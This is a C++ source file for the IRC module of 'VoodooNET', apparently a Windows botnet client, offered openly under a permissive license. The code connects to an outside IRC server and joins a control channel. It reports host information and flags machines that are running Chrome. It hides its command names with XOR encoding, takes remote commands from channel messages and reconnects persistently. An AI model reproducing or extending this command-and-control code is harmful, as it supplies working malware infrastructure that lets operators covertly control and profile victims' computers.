/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"

#pragma comment(lib,"Gdi32")
#pragma comment(lib,"ws2_32")
using namespace std;
#define PING_TIMEOUT 300
#include "config.h"


//char  server[] = "irc.vorteckzstudios.online";
//char channel[] = "";
#define channel "#dev"
//#define key "shadow"
cIRC::cIRC()
{
	m_socket = 0;
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("cIRC", "[Initializing]");
#endif
	prefix = false;
	bConnected = FALSE;
}

void cIRC::Init()
{	// irc.sendmsg
	ADDCMD(m_cmdIRCSendMessage, g_cVoodoo->m_cXORCipher.XORCipherDecrypt("1a1a024a1c121d0c0c1708", key).c_str(), g_cVoodoo->m_cXORCipher.XORCipherDecrypt("200d0f001c57124811160601121c04440212001b00030a57070741071a05010d0f104f141b090f0a0a1b", key).c_str(), this);
	// irc.nick <nickname>
	ADDCMD(m_cmdIRCNickChange, g_cVoodoo->m_cXORCipher.XORCipherDecrypt("1a1a024a011e1003", key).c_str(), g_cVoodoo->m_cXORCipher.XORCipherDecrypt("3000000a0812004828362c571d090c01", key).c_str(), this);
	// irc.quit
	ADDCMD(m_cmdIRCQuit, g_cVoodoo->m_cXORCipher.XORCipherDecrypt("1a1a024a1e021a1c", key).c_str(), g_cVoodoo->m_cXORCipher.XORCipherDecrypt("3701120700191d0d02101c571107154409051c0541370a05050d13", key).c_str(), this);
	start();


	ADDMODULE(m_cIRCModule, "cIRC", "0.1", "IRC Module");


}
char* deblank(char* str)
{
	char* out = str, * put = str;

	for (; *str != '\0'; ++str)
	{
		if (*str != ' ')
			*put++ = *str;
	}
	*put = '\0';

	return out;
}

bool cIRC::HandleCommand(char* cmd, char* params, ...)
{
	list<command*>::iterator ic;
	int iCount = 0;
	cString m_sCmd(cmd);
	cString m_sParam(params);
	for (ic = g_cVoodoo->m_cCommands.m_lCommands.begin(); ic != g_cVoodoo->m_cCommands.m_lCommands.end(); ++ic)
	{
		iCount++;
		if (!m_sCmd.CompareNoCase((*ic)->sName.c_str()))
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("cCommands:RegisteredCommand", "Registered Command: [Command: %s] [Description: %s]", (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.sendmsg("[cCommands]: Registered Command: [Command %d]: %s] [Description: %s]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
#ifndef NO_ASTRO
			g_cVoodoo->m_cAstro.sendmsg("[cCommands]: Registered Command: [Command %d]: %s] [Description: %s]", iCount, (*ic)->sName.c_str(), (*ic)->sDescription.c_str());
#endif
		}
	}
	if (!m_sCmd.Compare(g_cVoodoo->m_cXORCipher.XORCipherDecrypt("1a1a024a011e1003", key).c_str()))
	{
#ifndef NO_IRC
		if (!params)
			g_cVoodoo->m_cIRC.isend(m_socket, "NICK :%s\r\n", g_cVoodoo->m_cIRC.NickCreate());
		else
			g_cVoodoo->m_cIRC.isend(m_socket, "NICK :%s\r\n", m_sParam.CStr());
#endif
#ifndef NO_ASTRO
		if (!params)
			g_cVoodoo->m_cAstro.SendRaw("NICK :%s\r\n", g_cVoodoo->m_cServer.CreateName());
		else
			g_cVoodoo->m_cAstro.SendRaw("NICK :%s\r\n", m_sParam.CStr());
#endif
	}

	else if (!m_sCmd.CompareNoCase(g_cVoodoo->m_cXORCipher.XORCipherDecrypt("1a1a024a1c121d0c0c1708", key).c_str()))
	{
#ifndef NO_IRC
		g_cVoodoo->m_cIRC.sendmsg("%s", m_sParam.CStr());
#endif
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("%s", m_sParam.CStr());
#endif
	}
	else if (!m_sCmd.CompareNoCase(g_cVoodoo->m_cXORCipher.XORCipherDecrypt("1a1a024a1e021a1c", key).c_str()))
	{
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.Print("cIRC", "Quitting Server and Reconnect in 30s");
#endif
#ifndef NO_IRC
		g_cVoodoo->m_cIRC.Quit();
		g_cVoodoo->m_cIRC.bConnected = false;
#endif
	}
	return false;

}

char* cIRC::NickCreate()
{
	bool prefix = false;
	const std::string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	int length = MAX_NICKLEN;
	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, (int)characters.size() - 1);

	std::string random_string;

	srand((unsigned int)time(NULL));

	DWORD currentTimeD;
	DWORD tick = (DWORD)GetTickCount64();
	tick /= 1000;
	currentTimeD = (tick / 86400);
	std::stringstream ss;
	if (currentTimeD < 10)
	{
		ss << "[0" << currentTimeD << "|";
		random_string += ss.str();
	}
	else {
		ss << "[" << currentTimeD << "|";
		random_string += ss.str();
	}


	if (FindWindowA("Chrome_WidgetWin_0", 0))
	{

		random_string += "X";
		prefix = true;
	}
	if (prefix)
		random_string += "|";

	for (int i = (int)random_string.length(); i <= MAX_NICKLEN - 2; i++)

		random_string += characters[distribution(generator)];

	random_string += "]";
	char* chr = _strdup(random_string.c_str());

	return chr;
}
DWORD dwLastRecv;
DWORD WINAPI PingTimeoutThread(LPVOID param)
{
	NTHREAD timeout = *((NTHREAD*)param);
	NTHREAD* timeouts = (NTHREAD*)param;
//	timeouts->gotinfo = TRUE;
	cIRC* irc = (cIRC*)timeout.conn;
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.Print("IRC:Ping", "Ping Timeout Check Thread");
#endif
	//dwLastRecv = GetTickCount64();
	while (1)
	{
		if (((GetTickCount64() / 1000) - (dwLastRecv / 1000)) > PING_TIMEOUT)
		{
#ifdef _DEBUG
			g_cVoodoo->m_cLogging.PrintLine("IRC:Ping", "Lost Connection... resetting");
#endif
#ifndef NO_IRC
			g_cVoodoo->m_cIRC.isend(g_cVoodoo->m_cIRC.m_socket, "QUIT\r");
			g_cVoodoo->m_cIRC.bConnected = FALSE;
			closesocket(g_cVoodoo->m_cIRC.m_socket);
			g_cVoodoo->m_cThread.ClearThread(timeout.threadnum);
			g_cVoodoo->m_cIRC.start();
#endif
			ExitThread(0);
		}
		Sleep(PING_TIMEOUT * 1000);
	}
	ExitThread(0);
}

int cIRC::start()
{
	//	cLogging* cLog = (cLogging*)cLog;
#ifndef NO_IRC
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		printf("Unable to initialize Winsock.\r\n");
		Quit();
		start();

	}
#endif
	dwLastRecv = (DWORD)GetTickCount64();
	bConnected = FALSE;
	CMessage* msg = new CMessage;

	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	int iResult = getaddrinfo("irc.supernets.org", "6667", &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);

		WSACleanup();
		Sleep(30000);
		Quit();
		start();
		return false;
	}

	ptr = result;
	m_socket = (int)socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (m_socket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		Sleep(30000);
		Quit();
		start();
		return false;
	}
	DWORD id;
	NTHREAD timeout;
	char str_ping_thread[] = "Ping Timeout Thread";
	timeout.threadnum = g_cVoodoo->m_cThread.AddThread(PING_THREAD, str_ping_thread, "PingTimeOutThread");
	if (threads[timeout.threadnum].tHandle = CreateThread(NULL, 0, &PingTimeoutThread, (LPVOID)&timeout, 0, &id)) {

	}
	Sleep(50); // rest to prevent throttle

	iResult = connect(m_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.Print("IRC:Socket", "socket error");
#endif
		closesocket(m_socket);
		//int m_socket = INVALID_SOCKET;
		Sleep(30000);
		Quit();
		start();
		return false;
	}

	m_socket = m_socket;
	dwLastRecv = (DWORD)GetTickCount64();

	freeaddrinfo(result);

	if (m_socket == INVALID_SOCKET) {
#ifdef _DEBUG
		g_cVoodoo->m_cLogging.Print("IRC:Conn", "Unable to connect to server!");
#endif
		Sleep(30000);
		WSACleanup();
		Quit();
		start();
		return false;
	}
	bool bRecvd = false;
	char szLine[8192]; memset(szLine, 0, sizeof(szLine) - 1);
	bRecvd = recv(m_socket, szLine, sizeof(szLine) - 1, 0);

	while (bRecvd)
	{
		char buffer[MAX_DATA_SIZE];

		char szLine[MAX_DATA_SIZE]; memset(szLine, 0, sizeof(szLine));
		memset(buffer, 0, MAX_DATA_SIZE);
		cString sLine(szLine);

		int bytes = recv(m_socket, szLine, MAX_DATA_SIZE - 1, 0);

		if (bytes > 0)
		{

			dwLastRecv = (DWORD)GetTickCount64();
			if (!bConnected) {
				isend(m_socket, "USER %s 0 * :%s\r\n", NickCreate(), GetPCInfo());
				isend(m_socket, "NICK :%s\r\n", NickCreate());
				bConnected = TRUE;
			}
		}
		SplitRecv(szLine);
	}
	return 0;




}

void cIRC::SplitRecv(char* szLine)
{
	char* p;

	while (p = strstr(szLine, "\r\n"))
	{
		*p = '\0';
		ParseRecv(szLine);
		szLine = p + 2;
	}

}


bool cIRC::ParseRecv(char* szLine)
{
	cString sLine(szLine);

#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("IRC:Recv", "%s", sLine.CStr());
#endif

	if (!sLine.Token(0, " ").Compare("PING")) {
		isend(m_socket, "PONG :%s\r\n", sLine.Token(1, " ").CStr());
		isend(m_socket, "JOIN #shadow\r\n");
	}

	if (!sLine.Token(1, " ").Compare("376")) {
		isend(m_socket, "JOIN #shadow\r");
	}
	
	 if (!sLine.Token(1, " ").CompareNoCase("PRIVMSG"))
	{
		CMessage* pmsg = new CMessage;
		pmsg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
		pmsg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
		pmsg->cHost.Assign(sLine.Token(1, "@").Token(0, " "));
		pmsg->sDest.Assign(sLine.Token(2, " "));

		cString szText = strstr(sLine.CStr(), sLine.Token(1, ":").Token(0, " ").Token(0, " ").CStr());
		//pmsg->sChatString.Assign(strstr(sLine.Str(), " :"));
		//char* szText = pmsg->sChatString.Str();
		pmsg->sCmd.Assign(sLine.Token(1, ":").Token(0, " "));
		//pmsg->sParameters.Assign(sLine.Token(1, ":").Token(1, " "));

		pmsg->sParameters.Assign(strstr(szText.CStr(), szText.Token(1, " ")));

		if (!pmsg->sParameters.Compare(pmsg->sCmd.CStr()))
		{
			pmsg->sParameters.Empty();
			pmsg->sParameters.Assign("");
		}

		command* pCommand = g_cVoodoo->m_cCommands.FindCommand(pmsg->sCmd.CStr());
		if (pCommand) return pCommand->cHandle->HandleCommand(pmsg->sCmd.Str(), pmsg->sParameters.Str()); 
		

		return true;

	}
	 return false;
}
int cIRC::isend(int socket, const char* data, ...)
{

	char tbuffer[255];
	memset(tbuffer, 0, sizeof(tbuffer));
	int ret;
	va_list argp;
	va_start(argp, data);
	vsprintf_s(tbuffer, sizeof(tbuffer), data, argp);
	va_end(argp);
#ifndef NO_IRC
#ifdef _DEBUG
	g_cVoodoo->m_cLogging.PrintLine("IRC:Send", "%s", tbuffer);
	//printf("test\r\n");
#endif
#endif
#ifndef NO_ASTRO
//	g_cVoodoo->m_cAstro.sendmsg("[cAstro:Send]: %s", tbuffer);
#endif
	ret = send(socket, tbuffer, (int)strlen(tbuffer), 0);

	return ret;
}
int cIRC::Quit()
{
	int ret;
	ret = isend(m_socket, "QUIT\r");
	closesocket(m_socket);
	g_cVoodoo->m_cThread.ClearAllThreads();
	Sleep(30000);
#ifndef NO_IRC
	g_cVoodoo->m_cIRC.start();
#endif
	return ret;
}
int cIRC::sendmsg(const char* msg, ...)
{

#ifdef _DEBUG
	//	g_cVoodoo->m_cLogging.Print("cIRC:Module", "IRC Module Not Loaded");
	//	return 0;
#endif

	char tbuffer[(IRCLINE - (MAX_NICKLEN + 10))];
	memset(tbuffer, 0, sizeof(tbuffer));

	va_list argp;
	va_start(argp, msg);
	vsnprintf(tbuffer, sizeof(tbuffer), msg, argp);
	va_end(argp);

	Sleep(50);
	int ret = isend(m_socket, "PRIVMSG %s :%s\r\n", channel,  tbuffer);
	//newmsg(tbuffer, channel);
	return ret;
}


bool cIRC::newmsg(const char* szMsg, ...)
{
	cString sndbuf;
	sndbuf.Format("PRIVMSG %s :%s\r\n",channel, szMsg);

	return isend(m_socket, sndbuf.CStr());
}